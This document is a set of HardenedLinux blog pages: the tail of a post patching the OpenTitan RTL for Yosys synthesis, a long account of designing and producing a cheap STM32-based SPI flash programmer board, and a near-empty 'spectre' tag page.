1021c1021
<
---
> */
diff -r lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_tracer_0.1/rtl/ibex_tracer.sv /home/merle/workspaces/opentitan/build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ibex_ibex_tracer_0.1/rtl/ibex_tracer.sv
65c65
<
---
> /*
643c643
<     */
---
>     * /
913c913
<
---
> */
diff -r lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_hmac_0.1/rtl/hmac_pkg.sv /home/merle/workspaces/opentitan/build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_ip_hmac_0.1/rtl/hmac_pkg.sv
51,52c51,53
<     sha_word_t conv_data = {<<8{v}};
<     conv_endian = (swap) ? conv_data : v ;
---
>     //sha_word_t conv_data = {<<8{v}};
>     //conv_endian = (swap) ? conv_data : v ;
>     conv_endian = (swap) ? {v[7:0], v[15:8], v[23:16], v[31:24]} : v ;
diff -r lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_alert_receiver.sv /home/merle/workspaces/opentitan/build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_alert_receiver.sv
174c174
<
---
> /*
213c213
<
---
> */
diff -r lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_alert_sender.sv /home/merle/workspaces/opentitan/build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_alert_sender.sv
194c194
<
---
> /*
235c235
<
---
> */
diff -r lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_cipher_pkg.sv /home/merle/workspaces/opentitan/build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_cipher_pkg.sv
44c44
<   parameter logic [11:0][63:0] PRINCE_ROUND_CONST = {64'hC0AC29B7C97C50DD,
---
>   parameter logic [767:0] PRINCE_ROUND_CONST = {64'hC0AC29B7C97C50DD,
diff -r lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_lfsr.sv /home/merle/workspaces/opentitan/build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_lfsr.sv
302c302
<   if (64'(LfsrType) == 64'("GAL_XOR")) begin : gen_gal_xor
---
>   if (LfsrType == "GAL_XOR") begin : gen_gal_xor
327c327
<   end else if (64'(LfsrType) == "FIB_XNOR") begin : gen_fib_xnor
---
>   end else if (LfsrType == "FIB_XNOR") begin : gen_fib_xnor
392c392
<     if (64'(LfsrType) == 64'("GAL_XOR")) begin
---
>     if (LfsrType == "GAL_XOR") begin
402c402
<     end else if (64'(LfsrType) == "FIB_XNOR") begin
---
>     end else if (LfsrType == "FIB_XNOR") begin
438c438
<   if (ExtSeedSVA) begin : gen_ext_seed_sva
---
> //  if (ExtSeedSVA) begin : gen_ext_seed_sva
442,443c442,443
<     `ASSERT(ExtDefaultSeedInputCheck_A, (seed_en_i && rst_ni) |=> lfsr_q == $past(seed_i))
<   end
---
> //    `ASSERT(ExtDefaultSeedInputCheck_A, (seed_en_i && rst_ni) |=> lfsr_q == $past(seed_i))
> //  end
448c448
<   if (LockupSVA) begin : gen_lockup_mechanism_sva
---
> //  if (LockupSVA) begin : gen_lockup_mechanism_sva
450,452c450,452
<     `ASSERT(LfsrLockupCheck_A, lfsr_en_i && lockup && !seed_en_i |=> !lockup)
<   end
<
---
> //    `ASSERT(LfsrLockupCheck_A, lfsr_en_i && lockup && !seed_en_i |=> !lockup)
> //  end
> /*
486c486
<
---
> */
diff -r lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_prince.sv /home/merle/workspaces/opentitan/build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_all_0.1/rtl/prim_prince.sv
81c81
<     data_state[0] ^= prim_cipher_pkg::PRINCE_ROUND_CONST[0][DataWidth-1:0];
---
>     data_state[0] ^= prim_cipher_pkg::PRINCE_ROUND_CONST[0 * 64 + DataWidth-1: 0 * 64 + 0];
106c106
<                             prim_cipher_pkg::PRINCE_ROUND_CONST[k][DataWidth-1:0];
---
>                             prim_cipher_pkg::PRINCE_ROUND_CONST[k * 64 + DataWidth - 1:k * 64 + 0];
142c142
<                              prim_cipher_pkg::PRINCE_ROUND_CONST[10-NumRoundsHalf+k][DataWidth-1:0];
---
>                              prim_cipher_pkg::PRINCE_ROUND_CONST[(10 - NumRoundsHalf + k) * 64 + DataWidth - 1 : (10 - NumRoundsHalf + k) * 64 + 0];
167c167
<               prim_cipher_pkg::PRINCE_ROUND_CONST[11][DataWidth-1:0];
---
>               prim_cipher_pkg::PRINCE_ROUND_CONST[11 * 64 + DataWidth - 1: 11 * 64 + 0];
diff -r lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_diff_decode_0/rtl/prim_diff_decode.sv /home/merle/workspaces/opentitan/build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_diff_decode_0/rtl/prim_diff_decode.sv
210c210
<
---
> /*
259c259
<
---
> */
diff -r lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_generic_pad_wrapper_0/rtl/prim_generic_pad_wrapper.sv /home/merle/workspaces/opentitan/build/lowrisc_systems_top_earlgrey_verilator_0.1/src/lowrisc_prim_generic_pad_wrapper_0/rtl/prim_generic_pad_wrapper.sv
34a35
> /*
48c49,50
<
---
> */
>   assign inout_io = (oe) ? out : 1'bz;
```


### Empty statement


Since the assert statement is not synthesizable, no code will be generated. But there are some assertions in the source code based on the conditions, which will generate empty if statements. Yosys does not accept empty if statements.


The following files have empty sentences that need to be corrected:


```
	ibex_id_stage.sv
	prim_diff_decode.sv
	prim_lfsr.sv
	prim_alert_receiver.sv
	prim_alert_sender.sv
```


### Stream operator


In systemverilog, stream operators can easily implement endian conversion. sv2v will translate the stream manipulation into a complex function, causing yosys to report an error. We need to modify the corresponding code to achieve endian conversion by means of verilog. This code is located in `hmac_pkg.sv`.


The original implementation of systemverilog is as follows:


```
  typedef logic [31:0] sha_word_t;

  function automatic sha_word_t conv_endian( input sha_word_t v, input logic swap);
    sha_word_t conv_data = {<<8{v}};
    conv_endian = (swap) ? conv_data : v ;
  endfunction : conv_endian
```


The revised implementation is as follows:


```
  typedef logic [31:0] sha_word_t;

  function automatic sha_word_t conv_endian( input sha_word_t v, input logic swap);
    conv_endian = (swap) ? {v[7:0], v[15:8], v[23:16], v[31:24]} : v ;
  endfunction : conv_endian
```


### Driving strength


The strength syntax is not synthesizable, so the relevant code needs to be modified. The relevant code is located in the `prim_generic_pad_wrapper.sv` file


The code before modification is as follows:


```
// driving strength attributes are not supported by verilator
`ifdef VERILATOR
  assign inout_io = (oe) ? out : 1'bz;
`else
  // different driver types
  assign (strong0, strong1) inout_io = (oe && drv == STRONG_DRIVE) ? out : 1'bz;
  assign (pull0, pull1)     inout_io = (oe && drv == WEAK_DRIVE)   ? out : 1'bz;
  // pullup / pulldown termination
  assign (highz0, weak1)    inout_io = pu;
  assign (weak0, highz1)    inout_io = ~pd;
  // fake trireg emulation
  assign (weak0, weak1)     inout_io = (kp) ? inout_io : 1'bz;
`endif
```


The modified code is as follows:


```
assign inout_io = (oe) ? out : 1'bz;
/*
// driving strength attributes are not supported by verilator
`ifdef VERILATOR
  assign inout_io = (oe) ? out : 1'bz;
`else
  // different driver types
  assign (strong0, strong1) inout_io = (oe && drv == STRONG_DRIVE) ? out : 1'bz;
  assign (pull0, pull1)     inout_io = (oe && drv == WEAK_DRIVE)   ? out : 1'bz;
  // pullup / pulldown termination
  assign (highz0, weak1)    inout_io = pu;
  assign (weak0, highz1)    inout_io = ~pd;
  // fake trireg emulation
  assign (weak0, weak1)     inout_io = (kp) ? inout_io : 1'bz;
`endif
*/
```


### ibex_tracer.sv


ibex_tracer is a module for outputting debugging and tracing information. It only has input signals no output signals. There are a large number of non-synthesizable codes. Errors will occur during synthesis, so comment out the module body.


### prim_lfsr.sv


The prim_lfsr module has a parameter named LfsrType, which is a string. Located in the file prim_lfsr.sv. There are some string comparison codes in the code. These codes use type conversion. Sv2v translates it into a function named sv2v_cast_64. This function will trigger an error. So modify the source code and compare the strings directly.


### Two-dimensional array


There are restrictions on using two-dimensional arrays in verilog. sv2v converts the two-dimensional array declaration statement to a one-dimensional array when performing code conversion, but does not modify the code to access the two-dimensional array, so you need to manually modify the code to access the two-dimensional array.


Source code involved:


```
	prim_cipher_pkg.sv
	prim_prince.sv
```


# Synthesize


First, we need to create a synthetic script(build.ys) for yosys. The content is as follows:


```
read_verilog opentitan.v
hierarchy -check -top top_earlgrey
synth_ice40
write_blif out.blif
```


Then use the following command to synthesize:


```
yosys -s build.ys
```


# WIP Summary


For easier build, we released [the build script and workaround patch](https://github.com/hardenedlinux/hardenedlinux_profiles/tree/master/opentitan) here. The result of OpenTitan synthesis with Yosys:![](https://github.com/hardenedlinux/hardenedlinux.github.io/raw/master/images/opentitan-rtl.png)


You can take a look at LUTs usage. It’s not looking good due to the LUTs might be over the limit of the chips I currently have. Both ice40( ~5k) and ecp5( ~20-~85k) won’t make it. Either make the OpenTitan lose some “weight”( optimization/customization) or get more expensive FPGA products. [Virtex-7 FPGA VC707](https://www.xilinx.com/products/boards-and-kits/ek-v7-vc707-g.html) and [Alveo U250](https://www.xilinx.com/products/boards-and-kits/alveo/u250.html) seems overkill( a bit?) and more importantly those high end device aren’t support well by open/libre FPGA toolchain. [xc7](https://www.xilinx.com/products/silicon-devices/fpga/artix-7.html) should be an optional.


# OpenROAD RTL-to-GDS with OpenTitan


[OpenROAD](https://github.com/The-OpenROAD-Project) is a FLOSS based EDA solution integrate multiple [free/libre EDA-related tools](https://github.com/The-OpenROAD-Project) focus on RTL-to- [GDS layout generation](https://github.com/hardenedlinux/hardenedlinux_profiles/blob/master/opentitan/opentitan.gds). This is what OpenTitan looks like![](https://github.com/hardenedlinux/hardenedlinux.github.io/raw/master/images/openroad-opentitan.png)

---

# Cheap PCB story

`https://hardenedlinux.org/blog/2021-02-10-cheap-pcb-story`

# HardenedLinux

Feb 10, 2021 - 17 minute read - Research

Assuming that you’re a hardware hacker with full passionate about to making the new product and you dont want to build your own factory by tweaking around the [soldering workbench](https://github.com/pcbarts/vaporphaseone) or [PnP psychopunk machine](https://github.com/ottoragam/SimplePnP). It’s likely you’re end up somewhere( Asia: Shenzhen/Hongkong/Vietnam/etc, EU: Estonia/Germany/Sweden/etc, Americas: New Jersey/Mexico City/etc) to fit your need due to the trend of regional supply chain. You may encounter some problems no matter how the supply chain was formed. We’ll share what’ve been through the general problem in the hacking journey. We select the stm32 based system because it’s easy to implement the interfaces of IO, USB and a serial port programming circuit which is compatible with stm32-vserprog (SPI flash memory programmer).


We use [Kicad](https://docs.kicad.org/) as design tool and takes a several versions to achieve the current version. As each revision has been released with this document, hope it can be helpful to you in a way or another.


## Unit


### Length


Imperial unit system is heavily used in the PCB design, such as: package size of resistors and capacitors, wiring width, wiring spaceing, etc. The main commonly used imperial units are: ft, inch and mil. Noted the conversion: `1ft = 12inch = 12000mil = 304.8mm`


### Mass


When the wiring thickness is expressed by PCB, the unit of oz/ft 2 is used. The ft is the length unit mentioned above, and ft 2 is the area unit. oz is the mass unit ounce. Commonly used mass units in imperial are: lb, oz, dr. The conversion: `1lb = 16oz = 256dr = 453.59237g`


**tips** : Kicad provides a program pcb_calculator for calcuation: linear regulator parameters, wiring width, wiring spacing, etc.


## Resistors and capacitors


Resistors and capacitors have a three-digit or four-digit identification method, the unit of capacitance is pF, and the unit of resistance is Ω.


When the identifications are all numbers, the last digit identifies the power of 10. Here are some examples:


Identify the capacitors


- 510 -> 51*100pF=51pF
- 512 -> 51*102pF=5.1nF
- 1000 -> 100*100pF=100pF
- 1002 -> 100*102pF=10nF


Identify the resistors


- 510 -> 51×100Ω=51Ω
- 512 -> 51×102Ω=5.1KΩ
- 1000 -> 100×100Ω=100Ω
- 1002 -> 100×102Ω=10KΩ


For some small resistors, there are the following identification methods


- R10 -> 0.1Ω
- 5R1 -> 5.1Ω
- 0R10 -> 0.1Ω
- 5R10 -> 5.1Ω


## Package of SMD resistors and SMD capacitors


SMD resistors and SMD capacitors have standardized package. The package is identify with 4 digits (two digits for length and two digits for width), with imperial and metric identify methods.


The package size diagram is as follows:


![package size](https://hardenedlinux.org/images/cheapcb/resistor-size.png)


The relationship between size and package is as follows:


| package(imperial/metric) | l(inch/mm) | w(inch/mm) | h(inch/mm) |
| --- | --- | --- | --- |
| 0201/0603 | 0.024/0.6 | 0.012/0.3 | 0.01/0.25 |
| 0402/1005 | 0.04/1.0 | 0.02/0.5 | 0.014/0.35 |
| 0603/1608 | 0.06/1.55 | 0.03/0.85 | 0.018/0.45 |
| 0805/2012 | 0.08/2.0 | 0.05/1.2 | 0.018/0.45 |
| 1206/3216 | 0.12/3.2 | 0.06/1.6 | 0.022/0.55 |
| 1210/3225 | 0.12/3.2 | 0.10/2.5 | 0.022/0.55 |
| 1812/3246 | 0.12/3.2 | 0.18/4.6 | 0.022/0.55 |
| 2010/5025 | 0.2/5.0 | 0.1/2.5 | 0.024/0.6 |
| 2512/6332 | 0.25/6.3 | 0.12/3.2 | 0.024/0.6 |


The schematic diagram of the pad is as follows:


![pad size](https://hardenedlinux.org/images/cheapcb/pad-size.png)


The relationship between pad size and package is as follows:


| package(imperial/metric) | a(inch/mm) | b(inch/mm) | c(inch/mm) |
| --- | --- | --- | --- |
| 0201/0603 | 0.012/0.3 | 0.012/0.3 | 0.012/0.3 |
| 0402/1005 | 0.024/0.6 | 0.020/0.5 | 0.020/0.5 |
| 0603/1608 | 0.035/0.9 | 0.024/0.6 | 0.035/0.9 |
| 0805/2012 | 0.051/1.3 | 0.028/0.7 | 0.047/1.2 |
| 1206/3216 | 0.063/1.6 | 0.035/0.9 | 0.079/2.0 |
| 1812/3246 | 0.19/4.8 | 0.035/0.9 | 0.079/2.0 |
| 2010/5025 | 0.11/2.8 | 0.059/0.9 | 0.15/3.8 |
| 2512/6332 | 0.14/3.5 | 0.063/1.6 | 0.15/3.8 |


For SMD resistors, the package of the resistor is related to the power, and the corresponding relationship is as follows:


| package(imperial/metric) | power(watt) |
| --- | --- |
| 0201/0603 | 1/20 |
| 0402/1005 | 1/16 |
| 0603/1608 | 1/10 |
| 0805/2012 | 1/8 |
| 1206/3216 | 1/4 |
| 1210/3225 | 1/2 |
| 1812/3246 | 1 |
| 2010/5025 | 3/4 |
| 2512/6332 | 1 |


**Tips**: The provider of resistor and capacitor in China usually requires imperial package.


## Model selection


The selection needs to consider the following factors:


- Diverse electronic components provided by EDA tool is low-hanging fruits
- Popularity, is it easy to buy?
- the price of components
- whether the size and packaging meet the design requirements


## Design


### Power supply circuit


#### Power supply protection circuit


In order to connect the power via USB interface, the protection of the USB power supply is needed.


1. Prevent circuit backflow and reverse connection
2. Prevent excessive current consumption


The current backflow prevention can be implemented by Schottky diode. Schottky diodes have the characteristics of small forward voltage drop and are suitable for this application scenario.


Schottky diode should be considered to be used in the higher priority. USB 2.0 is able to provide 5V 500mA power supply. We need a schottky diode with a reverse voltage greater than 5V and an overcurrent greater than 500mA. In Kicad, try 1N5817 (20V/1A). We found 1N5817WS with a smaller package in a local electronic store. We chose 1N5817WS because it’ll make the layout more compacter. The next step is to confirm whether the electrical parameters are appropriate. The pressure drop of the conduction must be considered. We found the data sheet on the Internet. The current and voltage curve of this tube is shown in the figure below.


![1N5817WS current-voltage curve](https://hardenedlinux.org/images/cheapcb/1N5817WS_Current_Voltage_Curve.png)


It can be easy spotted that the voltage drop of this diode is less than 0.4V at 500mA, which meets the requirements.


Then select the suitable fuse. The choice of self-recovery fuse is relatively simple. We searched for a 500mA self-recovery fuse in a local store and chose a compact package. It’s 0805.


### Voltage conversion circuit


STM32 requires 3.3V power supply. USB provides 5V power supply. We need a power conversion chip. You can find the AMS1117-3.3 (package SOT-223) in Kicad library. But we found a smaller package SOT-89-3 in a local store. In order to make the board more compact, smaller package is better.


For the input and output of the voltage regulator chip, two bypass capacitors are required to store energy and filter out clutter. Finally, the power supply circuit is as follows:


![power supply circuit](https://hardenedlinux.org/images/cheapcb/power-supply-circuit.png)


### USB circuit


Type-c interface is convenient to make the connection. Find information ( [USB Type-C Configuration Channel (CC) pin function](https://kevinzhengwork.blogspot.com/2014/09/usb-type-c-configuration-channel-cc-pin.html)). It is known that for the c-to-c data line, the power supply of VBUS does not always exist, and the voltage is output only when the pull-down 5.1K resistance of the CC pin is detected at the host end. We need to connect a 5.1K resistor to ground in CC1 and CC2 respectively. For the a-to-c data line VBUS always exists, but the host needs to detect the device insertion through the pull-up resistor on D+/D-, and determine whether the device is a full speed device or a low speed device. STM32 is not able to process USB transactions as soon as it is powered on. It needs to wait for the initialization to complete, so the pull-up resistor needs to be controlled by a GPIO. The final USB interface circuit diagram of the STM32 end is as follows:


![STM32 USB Port](https://hardenedlinux.org/images/cheapcb/STM32-USB-Port.png)


**Note**: If type-c is to detect the power supply capability, the accuracy of 5.1K resistance is required, see the following figure for details:


![type-c Rd requirement](https://hardenedlinux.org/images/cheapcb/type-c_Rd_requirement.png)


Serial programming needs to be implemented through a serial port, and a USB to serial port circuit is needed. [CH330N](https://datasheet.lcsc.com/szlcsc/Jiangsu-Qin-Heng-CH330N_C108996.pdf) is small in size and does not require an external crystal oscillator. The final serial port programming circuit is as follows:


![serial programming circuit](https://hardenedlinux.org/images/cheapcb/serial-programming-circuit.png)


### Other


For STM32, we chose STM32F103C8T6 but some auxiliary circuits are needed: reset circuit, external crystal oscillator, and startup configuration.


The reset circuit is generally implemented by an RC circuit, and the charging time calculation can be found in [wikipedia](https://en.wikipedia.org/wiki/RC_time_constant). The final circuit is as follows:


![reset circuit](https://hardenedlinux.org/images/cheapcb/reset-circuit.png)


The external crystal oscillator used the passive ones. Passive crystal oscillators need to be matched with suitable capacitors to work. The choice of capacitance is related to a characteristic load capacitance of the crystal oscillator. The relationship is as follows: CL = (C1*C2)/(C1+C2) + Cstray.


- CL, load capacitance of the crystal oscillator
- C1/C2, the capacitance of the two capacitors that work with the crystal oscillator
- Cstray, equivalent capacitance of printed circuit and component pin


The final circuit is as follows:


![crystal circuit](https://hardenedlinux.org/images/cheapcb/crystal-circuit.png)


Start-up configuration, STM32 has two pins (BOOT0/BOOT1) for selecting where to start running when powering up, the startup method is as follows:


| BOOT0 | BOOT1 | BOOT Mode |
| --- | --- | --- |
| x | 0 | Main Flash Memory |
| 0 | 1 | System Memory (Used for serial programming) |
| 1 | 1 | Embedded SRAM (Used for Debug) |


The final startup configuration circuit is as follows:


![boot configure](https://hardenedlinux.org/images/cheapcb/boot-configure.png)


## Layout


Kicad can be routing through automated tools. What we need to do is:


- Determine how many layers to use
- Place related components close by
- Draw PCB physical boundaries
- Draw the wiring boundary of the PCB
- Export Spectra DSN
- Call freerouting for routing
- Save Specctra Session
- Import Specctra Session


For the use of freerouting, please refer to [Document](https://github.com/freerouting/freerouting/blob/master/README.md)


*For the use of freerouting, please refer to 
Document*

## Panelization of the boards


It’s feasible make multiple smaller boards on the bigger ones by panelizing the PCB. The joints between the boards are specially processed, which is easier to divide later. Rails can be added around the boards for fixing during processing.


The work can be done through [kikit](https://github.com/yaqwsx/KiKit), kikit is a command line tool implemented by python3, installed by the following command:


```
pip3 install kikit
```


kikit supports two methods for the connection between the boards: vcut and stamp hole. vcut refers to a groove at the joint of the boards, which is suitable for square and rectangular boards, but not for irregular boards. Stamp hole (mouse bites), a series of continuous through holes are punched at the connection, the shape is similar to a stamp, so it is called a stamp hole, suitable for irregularly shaped boards.


The layout need to be completed before panelizing the PCB. Kikit can arrange multiple boards according to the order, add gaps between the boards, and add rails up and down or left and right after panelization. The main command line parameters used are as follows:


```
➜  ~ kikit panelize grid --help
Usage: kikit panelize grid [OPTIONS] INPUT OUTPUT

  Create a regular panel placed in a frame.

  If you do not specify the panelsize, no frame is created

Options:
  -s, --space FLOAT               Space between boards
  -g, --gridsize <INTEGER INTEGER>...
                                  Panel size <rows> <cols>
  -p, --panelsize <FLOAT FLOAT>...
                                  Add a frame to a panel. The argument
                                  specifies it size as <width> <height>
  --railsTb FLOAT                 Add bottom and top rail. Specify its
                                  thickness in mm
  --railsLr FLOAT                 Add left and right rail. Specify its
                                  thickness in mm
  --tabwidth FLOAT                Size of the bottom/up tabs, leave unset for
                                  full width
  --tabheight FLOAT               Size of the left/right tabs, leave unset for
                                  full height
  --htabs INTEGER                 Number of horizontal tabs for each board
  --vtabs INTEGER                 Number of vertical tabs for each board
  --vcuts                         Use V-cuts to separe the boards
  --vcutcurves                    Use V-cuts to approximate curves using
                                  starting and ending point
  --mousebites <FLOAT FLOAT FLOAT>...
                                  Use mouse bites to separate the boards.
                                  Specify drill size, spacing and offset from
                                  cutedge (use 0.25 mm if unsure)
  --radius FLOAT                  Add a radius to inner corners
  --rotation FLOAT                Rotate input board (in degrees)
  --sourcearea <FLOAT FLOAT FLOAT FLOAT>...
                                  x y w h in millimeters. If not specified,
                                  automatically detected
  --tolerance FLOAT               Include items <tolerance> millimeters out of
                                  board outline
  --renamenet TEXT                Rename pattern for nets. You can use '{n}'
                                  for board sequential number and '{orig}' for
                                  original net name
  --renameref TEXT                Rename pattern for references. You can use
                                  '{n}' for board sequential number and
                                  '{orig}' for original reference name
  --tabsfrom <TEXT FLOAT>...      Create tabs from lines in given layer. You
                                  probably want to specify --vtabs=0 and
                                  --htabs=0. Format <layer name> <tab width>
  --framecutV                     Insert vertical cuts through the frame
  --framecutH                     Insert horizontal cuts through the frame
  --copperfill / --nocopperfill   Fill unsed areas of the panel with copper
  --tooling <FLOAT FLOAT FLOAT>...
                                  Add tooling holes to corners of the panel.
                                  Specify <horizontalOffset> <verticalOffset>
                                  <diameter>.
  --fiducials <FLOAT FLOAT FLOAT FLOAT>...
                                  Add fiducials holes to corners of the panel.
                                  Specify <horizontalOffset> <verticalOffset>
                                  <copperDiameter> <openingDiameter>.
  --help                          Show this message and exit.
```


## Export positions of the component


During welding production, component position information is required. Open Kicad’s pcb editor, click [File]->[Fabrication Outputs]->[Footprint Position(.pos) File…], and follow the prompts to output component positions. Position information includes: coordinates, layer, rotation angle.


## Production


### PCB and PCBA


PCB is a printed circuit board. The production mode can produce the PCB we draw in Kicad. After we get the board, we need to solder the components ourselves. PCBA (Printed Circuit Board + Assembly) is the finished PCB after SMT and DIP welding.


PCB price factors:


- Material cost: sheet material, sheet thickness, copper thickness (there is a calculator in Kicad that can calculate the ability of the circuit by wiring width and copper thickness)
- Process cost: wiring width, wiring spacing, surface treatment process (OSP anti-oxidation, lead spray tin, lead-free tin spray, gold plating, immersion gold, immersion tin, immersion silver, etc.), aperture, blind hole, buried hole


The price factor of PCBA:


- the cost is similar to the above but the soldering cost is related to the scales: A patch solder joint is about 0.01 CNY(~0.0015 USD), and a plug-in solder joint is 0.05 CNY(~0.0076 USD); small batch production will charge a process fee of 0-800 CNY(0 – ~123 USD)


### First production


The production of two-layer PCB production is mature in Shenzhen. The price is about 30 CNY for 10 boards through the relative expensive business channel like TaobaoO. We didn’t do the power protection circuit for the first prototyping but the 2nd batch.


### Second production


Power protection circuit was added in the 2nd prototyping. We inquiried a few providers via Taobao. The PCB assembly of 10 boards is about 300-800 CNY if you provide all materials( including PCB and components). If you need the other party prepares materials, it will add extra cost about 200-400 CNY.


- 2020.10.4 place an order
- 2020.10.13 material delivery
- 2020.10.25 received the board


In order to deep understanding the market. We did a little study which is make the PCBs at first and then went to manual soldering service in the electronic market. We received the PCB in 4 days since the order thanks to the mature supply chain eco-system. It cost ~50 CNY for each PCB board. You should choose manual welding service which is lower cost if you only intend to production in small scale. But we fucked up this time due to three boards had serious problem. CH340N was soldered in a very wrong way. Then we tried to solder CH340N from scratch. Unfortunately, only one of them can be detected but it was another problem with the USB D-pin connection. It poped a message that USB was inserted after the MCU started running but communication fails.


The SMT factory was not responsible for PCB assembly, so we sent 5 boards:


Final cost:


- PCB cost (10 boards): 67 CNY
- SMT welding(5 sets): 600 CNY
- Components (10 sets): 288 CNY
- Manual welding (3 boards): 150 CNY


The final machine welded 5 pieces, the cost per piece: 155.5 Finally, 3 pieces were manually welded, and the cost per piece: 85.5


Experience gained in this production:


- Should do better and effective communication with the factory.
- 0201 package is too small. 0603 is more convenient for manual welding.
- For small batch production, the cost of manual welding is low. It’s necessary to find skilled welding workers, otherwise failure rate could be higher than expected.
- In some cases, SMT production need panelization. SMT machine is likely inefficient on small PCB production and may pose a challenge to fixtures. Talk to SMT factory about the detail before proceed to production.


### Third production


In order to facilitate manual soldering, a larger package (0603) resistance capacitor is used instead. This time, place an order through an online platform (jdbpcb.com), which provides prototying and SMT welding services. This platform needs to communicate with customer service through QQ, and the service is more professional than Taobao. Two boards failed in production.


The final cost of 10 boards is 164 CNY for prototyping, 330 CNY for SMT welding and 220 CNY for components. Final per piece cost: 71.4 CNY


One thing wasn’t pleasant when using the platform this time: We placed an order for both PCBA and SMT at the same time but the checkout needs to be paid separately in two places. It misled us to believed that the platform was a low cost option.


Experience gained in this production:


- The number of layers has a great influence on the price
- Line width and line spacing are less than or equal to 5mil, and engineering fees will be charged
- For vias less than or equal to 0.25, engineering fees will be charged
- The thickness of the plate is less than or equal to 0.4 or greater than or equal to 2.0 will charge engineering fees


### Fourth production


The manual soldering pass rate of the second production is too low, and the cost is increased because the vias of the third production are too small. The utilization rate of the serial port programming circuit is very low, and there is no separate SWD programming debugging interface, so the connection is very troublesome. We changed the board : remove the serial port circuit, change the size of the vias, lead out more IO, switch to a single row of pins and add labels, switch to a pad package that is convenient for manual soldering. And order steel mesh, you can try manual SWD.


Manual SMD requires highly skills. Place the components as soon as possible after brushing the solder paste. Don’t shake your hands when placing the components, otherwise the solder paste will be smeared and short-circuited.


### Fifth production


When working with flashrom as a flash reader, it’s a bit of annoying to find out the pins according to PCB design. We added a 8-pin header to facilitate connection with SOP8 clips. Since the pins of regular spi flash have two common layouts(23/25/26 and 45 series), two 8-pin header have been added.


Total cost:


- PCB cost (10 pieces): 50 CNY
- SMD welding(10 sets): 330 CNY
- Components(10 sets): 340 CNY


Final per piece cost: 72


Experience in this production:


- Buying components from one supplier many times, the price will be too high, you can try to inquire other suppliers. The cost of the single-chip microcontroller has risen from 15 CNY to 20 CNY this time, which is 33.3% more expensive than last time.


### Sixth production


A circuit bug was found after the fifth production. The WP pin level control circuit did not add a current limiting resistor, which may cause a short circuit. This current revision has added the current limiting resistor. Due to the complexity of the onboard flash, the current version still faces the following problems:


- If the target board has low power and works at 3.3V, the main chip may work when the flash clip is clamped. There are two master on the spi bus, and strange problems occurs
- When the target board power is high, because the flash reader is powered by USB, the voltage of the reader will be pulled down and it will not work normally
- The target WP pin has a pull-down resistor, then it will be divided by our current limiting resistor, which may cause the device to be unable to write


The board that can be operated directly through the flash clip should have the following characteristics:


- There is a diode on the power pin to prevent current backflow
- If the WP pin has a pull-down resistor, the resistance value of the resistor should be larger. Refer to the flash datasheet for details


Total cost:


- PCB cost (10 pieces): 50 CNY
- SMD welding(10 sets): 530 CNY
- Components(10 sets): 300 CNY


Final per piece cost: 88


As the Spring Festival is approaching, labor increases, sellers no longer give discount, so the cost of SMD has risen a lot. The previous seller increased the price again so we chose to buy on Taobao. But the quantity required by the same seller on Taobao this time.


### Pictures of finished products


First version ![v1](https://hardenedlinux.org/images/cheapcb/v1.jpg)


Second version ![v2](https://hardenedlinux.org/images/cheapcb/v2.jpg)


Third version ![v3](https://hardenedlinux.org/images/cheapcb/v3.jpg)


Fourth version ![v4](https://hardenedlinux.org/images/cheapcb/v4.jpg)


Fifth version ![v5](https://hardenedlinux.org/images/cheapcb/v5.jpg)


Sexth version ![v6](https://hardenedlinux.org/images/cheapcb/v6.jpg)


### Experience


- Multi-party inquiry! In the absence of quantity, the price you inquired about will be higher. The communication skill is important during the inquiry
- If there is no batch production, do not rely on a single supplier (price may rise)
- Distribution service needs to pay a little more cost which compare to buy the components seperately
- Choose the appropriate process (wiring width, wiring spacing, number of board layers, surface process, vias, blind vias, buried vias), it is best to check with the manufacturer before design
- For small batch production, you can choose to weld by yourself or find skilled workers to process, but you must pay attention to choosing people with reliable craftsmanship, otherwise the pass rate is terrible
- Avoid important local holidays, increase labor costs, and extend the construction period


## Supplies


| device | package | quantity |
| --- | --- | --- |
| Capacitor 10uF | 0603 | 2 |
| Capacitor 10nF | 0603 | 1 |
| Capacitor 100nF | 0603 | 8 |
| Capacitor 22pF | 0603 | 2 |
| Schottky diodes 1N5817WS | SOD-323 | 1 |
| light-emitting diode Red | 0603 | 1 |
| light-emitting diode Blue | 0603 | 1 |
| light-emitting diode Yellow | 0603 | 1 |
| Fuse 500mA | 0805 | 1 |
| Fuse 100mA | 0805 | 1 |
| USB C Receptacle | Palconn UTC16-G | 1 |
| 2×4 2.54mm PinHeader |  | 2 |
| 1×25 2.54mm PinHeader |  | 2 |
| Transistor S9012 | SOT-23 | 1 |
| Resistor 1K | 0603 | 6 |
| Resistor 10K | 0603 | 3 |
| Resistor 5.1K | 0603 | 2 |
| Resistor 22 | 0603 | 2 |
| Resistor 1K5 | 0603 | 1 |
| Button KMR241G |  | 1 |
| AMS1117-3.3 | SOT-89 | 1 |
| STM32F103C8T6 | LQFP-48 | 1 |
| Crystal 8MHz | SMD 3225 | 1 |

---

# spectre

`https://hardenedlinux.org/tags/spectre`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2018


